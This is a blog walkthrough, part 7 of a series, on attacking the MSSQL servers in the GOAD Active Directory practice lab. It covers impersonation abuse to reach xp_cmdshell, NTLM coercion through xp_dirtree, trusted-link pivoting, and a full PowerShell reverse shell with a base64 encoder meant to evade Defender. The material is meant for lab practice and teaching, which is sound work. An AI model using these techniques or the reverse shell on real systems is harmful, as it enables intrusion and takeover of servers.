---
layout: post
title:  "GOAD - part 7 - MSSQL"
category : AD
tags :  AD, Lab, MSSQL
---

On the previous post ([Goad pwning part6]({% link _posts/2022-09-07-GOADv2-pwning-part6.md %})) we tried some attacks with ADCS activated on the domain. Now let's take a step back, and go back on the castelblack.north.sevenkingdoms.local to take a look at the MSSQL server.

Before jump into this chapter, i have done some small configuration on the lab, to be sure you get it, you should pull the updates and play : `ansible-playbook servers.yml` to get the last mssql configuration.

- This modifications are:
  - arya.stark execute as user dbo impersonate privilege on msdb
  - brandon.stark impersonate on jon.snow

## Enumerate the MSSQL servers

### Impacket GetUserSPNs.py

- First let's try to figure out the users with an SPN on an MSSQL server

```bash
GetUserSPNs.py north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```

- And on essos domain

```bash
GetUserSPNs.py -target-domain essos.local north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```

![mssql_getuserspn.png](/assets/blog/GOAD/mssql_getuserspn.png)


### Nmap

```bash
nmap -p 1433 -sV -sC 192.168.56.10-23
```

Two servers answer : 
- castelblack.north.sevenkingdoms.local

![mssql_nmap_castelblack.png](/assets/blog/GOAD/mssql_nmap_castelblack.png)

- braavos.essos.local : the result is identical as castelblack.

### CrackMapExec

- Let's try with crackmapexec 

```bash
./cme mssql 192.168.56.22-23
```

![mssql_cme.png](/assets/blog/GOAD/mssql_cme.png)

- Now we could try with the user samwell.tarly

```bash
./cme mssql 192.168.56.22 -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local
```

![mssql_cme_samwell.png](/assets/blog/GOAD/mssql_cme_samwell.png)

- As we can see we got an access to the database

### Impacket

- To enumerate and use impacket mssql, i made a modified version of the example mssqlclient.py.
- You can find the version [here](https://github.com/SecureAuthCorp/impacket/pull/1397)

- The install is just like what we done in part5 merge the PR on your local impacket project and relaunch install:

```bash
cd /opt/tools
git clone https://github.com/SecureAuthCorp/impacket myimpacket
cd myimpacket
python3 -m virtualenv myimpacket
source myimpacket/bin/activate
git fetch origin pull/1397/head:1397
git merge 1397
python3 -m pip install .
```

- We connect to the mssql server with the following command :

```bash
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/samwell.tarly:Heartsbane@castelblack.north.sevenkingdoms.local
```

- And type help:
```
     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     enum_db                    - enum databases
     enum_links                 - enum linked servers
     enum_impersonate           - check logins that can be impersonate
     enum_logins                - enum login users
     enum_users                 - enum current db users
     enum_owner                 - enum db owner
     exec_as_user {user}        - impersonate with execute as user
     exec_as_login {login}      - impersonate with execute as login
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     xp_dirtree {path}          - executes xp_dirtree on the path
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
     ! {cmd}                    - executes a local shell cmd
     show_query                 - show query
     mask_query                 - mask query
```

- I added some new entries to the database : enum_db/enum_links/enum_impersonate/enum_login/enum_owner/exec_as_user/exec_as_login/use_link/show_query/mask_query

- Let's start the enumeration :

```
enum_logins
```

- This launch the following query (roles value meaning can be show [here](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-principals-transact-sql?view=sql-server-ver16))

```sql
select r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, 
sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin 
from  master.sys.server_principals r 
left join master.sys.syslogins sl on sl.sid = r.sid 
where r.type in ('S','E','X','U','G')
```

- We see only a basic view as we are a simple user
![mssql_enum_login_samwell.png](/assets/blog/GOAD/mssql_enum_login_samwell.png)


### impersonate - execute as login

- Let's enumerate impersonation values:

```
enum_impersonate
```

- This launch the following queries:

```sql
SELECT 'LOGIN' as 'execute as','' AS 'database', 
pe.permission_name, pe.state_desc,pr.name AS 'grantee', pr2.name AS 'grantor' 
FROM sys.server_permissions pe 
JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_Id 
JOIN sys.server_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
```

- The previous command list all login with impersonation permission

- This launch also the following command on each databases :

```sql
use <db>;
SELECT 'USER' as 'execute as', DB_NAME() AS 'database',
pe.permission_name,pe.state_desc, pr.name AS 'grantee', pr2.name AS 'grantor' 
FROM sys.database_permissions pe 
JOIN sys.database_principals pr ON pe.grantee_principal_id = pr.principal_Id 
JOIN sys.database_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
```

- The previous command list all users with impersonation permission

> What is the hell ? login and user, what is the difference ?
- A "Login" grants the principal entry into the **SERVER**
- A "User" grants a login entry into a single **DATABASE**

- I found out an image who explain it well and also a very nice summary [here](https://blog.sqlauthority.com/2019/05/21/sql-server-difference-between-login-vs-user-security-concepts/)

_"SQL Login is for Authentication and SQL Server User is for Authorization. Authentication can decide if we have permissions to access the server or not and Authorization decides what are different operations we can do in a database. Login is created at the SQL Server instance level and User is created at the SQL Server database level. We can have multiple users from a different database connected to a single login to a server."_

![mssql_login_vs_user.png](/assets/blog/GOAD/mssql_login_vs_user.png)

- Ok let see the result :

![mssql_enum_impersonate_samwell.png](/assets/blog/GOAD/mssql_enum_impersonate_samwell.png)

- Ok samwell got login impersonation to the user sa.
- So we can impersonate sa with `execute as login` and execute commands with xp_cmdshell

```
exec_as_login sa
enable_xp_cmdshell
xp_cmdshell whoami
```

- This launch the following commands:

```sql
execute as login='sa';
exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;
exec master..xp_cmdshell 'whoami'
```

- And we get a command execution !

![mssql_impersonate_exec_samwell.png](/assets/blog/GOAD/mssql_impersonate_exec_samwell.png)

- Let's continue our enumeration as login **sa** this time:

```
enum_logins
```

![mssql_enum_login_sa.png](/assets/blog/GOAD/mssql_enum_login_sa.png)

- As we can see with sa login we see a lot more things. And we can see that jon.snow is sysadmin on the mssql server

- Let's see if there is others impersonation privileges:

```
enum_impersonate
```

![mssql_impersonate_sa.png](/assets/blog/GOAD/mssql_impersonate_sa.png)

- As sysadmin user (sa), we can see all the information in the database and so the others users with impersonation privileges.
- Another way to get in could be to access as brandon.stark and do `execute as login` on user jon.snow.

### impersonate - execute as user

- We launch a connection to the db as arya.stark :

```bash
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local
```

- if we use master db and impersonate user dbo we can't get a shell

```sql
use master
execute as user = "dbo"
exec master..xp_cmdshell 'whoami'
```

![mssql_arya_execas_masterdbo.png](/assets/blog/GOAD/mssql_arya_execas_masterdbo.png)

- but our user also got impersonate user privilege on dbo user on database msdb

![mssql_arya_impersonate.png](/assets/blog/GOAD/mssql_arya_impersonate.png)

- The difference between the two databases is that msdb got the trustworthy property set (default value on msdb).

![mssql_arya_db_trustworthy.png](/assets/blog/GOAD/mssql_arya_db_trustworthy.png)

- With the trustworthy property we get a shell :

![mssql_arya_execas_msdbdbo.png](/assets/blog/GOAD/mssql_arya_execas_msdbdbo.png)

### Coerce and relay

- Mssql can also be use to coerce an NTLM authentication from the mssql server. The incoming connection will be from the user who run the mssql server.
- In our case if we tale any user like hodor for example we can get an NTLM authentication
 - start responder `responder -I vboxnet0`

- Connect with hodor (0 privilèges)

```bash
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/hodor:hodor@castelblack.north.sevenkingdoms.local
```

- run a xp_dirtree command :

```sql
exec master.sys.xp_dirtree '\\192.168.56.1\demontlm',1,1
```

- And we get a connection back to our responder

![mssql_hodor_relay.png](/assets/blog/GOAD/mssql_hodor_relay.png)

- This will work also with ntlmrelayx (like with a server running as administrator and with the same password on other servers). But on the lab, this kind of behavior is not setup by now.


### trusted links

- Another SQL abuse we could try on the lab, is the usage of mssql trusted links.

> Note that trusted link is also a forest to forest technique

- To abuse the links let's connect with jon.snow and use enum_links

```bash
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/jon.snow:iknownothing@castelblack.north.sevenkingdoms.local -show
SQL (NORTH\jon.snow  dbo@master)> enum_links
```

- This play the following queries :

```sql
EXEC sp_linkedservers
EXEC sp_helplinkedsrvlogin
```

![mssql_trusted_links.png](/assets/blog/GOAD/mssql_trusted_links.png)

- As we can see a linked server exist with the name BRAAVOS and a mapping exist with the user jon.snow and sa on braavos.

- If we use the link we can get a command injection on braavos:

```
use_link BRAAVOS
enable_xp_cmdshell
xp_cmdshell whoami
```

- This play the following MSSQL commands :

```sql
EXEC ('select system_user as "username"') AT BRAAVOS
EXEC ('exec master.dbo.sp_configure ''show advanced options'',1;RECONFIGURE;exec master.dbo.sp_configure ''xp_cmdshell'', 1;RECONFIGURE;') AT BRAAVOS
EXEC ('exec master..xp_cmdshell ''whoami''') AT BRAAVOS
```

![mssql_trusted_links_exec.png](/assets/blog/GOAD/mssql_trusted_links_exec.png)

- We got a command injection on braavos.essos.local as essos\sql_svc

- I have done the modifications on mssqlclient.py to be able to chain trusted_links. From this we can continue to another trusted link, etc...

- Example :

![mssql_trusted_links_exec_chained.png](/assets/blog/GOAD/mssql_trusted_links_exec_chained.png)


## Command execution to shell

- We got command execution on castelblack and also on braavos. But now we want a shell to interact with the server.
- To get a shell we can use a basic Powershell webshell (There is one available on the [arsenal](https://github.com/Orange-Cyberdefense/arsenal) commands cheatsheet project. This is another of my projects that i will need to improve when i get the time, but this script do not bypass defender anymore, so let's write some modifications):

```powershell
$c = New-Object System.Net.Sockets.TCPClient('192.168.56.1',4444);
$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
};
$c.Close()
```

- Let's convert this powershell command to base64 in utf-16 for powershell

```python
#!/usr/bin/env python
import base64
import sys

if len(sys.argv) < 3:
  print('usage : %s ip port' % sys.argv[0])
  sys.exit(0)

payload="""
$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
};
$c.Close()
""" % (sys.argv[1], sys.argv[2])

byte = payload.encode('utf-16-le')
b64 = base64.b64encode(byte)
print("powershell -exec bypass -enc %s" % b64.decode())
```

![mssql_powershellb64.png](/assets/blog/GOAD/mssql_powershellb64.png)

- run it and get a shell

![mssql_exec_xpcmdshell_reverse.png](/assets/blog/GOAD/mssql_exec_xpcmdshell_reverse.png)

## Other tools to use

- There is some interresting projects to exploit mssql, here is some of them : 
  - [https://github.com/NetSPI/ESC](https://github.com/NetSPI/ESC)
  - [https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
  - [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs)

- Interresting informations :
  - [https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
  - [https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/mssql](https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/mssql)
  - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
  - [https://h4ms1k.github.io/Red_Team_MSSQL_Server/#](https://h4ms1k.github.io/Red_Team_MSSQL_Server/#)
  - [https://github.com/Jean-Francois-C/Database-Security-Audit/blob/master/MSSQL%20database%20penetration%20testing](https://github.com/Jean-Francois-C/Database-Security-Audit/blob/master/MSSQL%20database%20penetration%20testing)


Next time we will have fun with IIS and we will get an nt authority\system shell on mssql and iis :)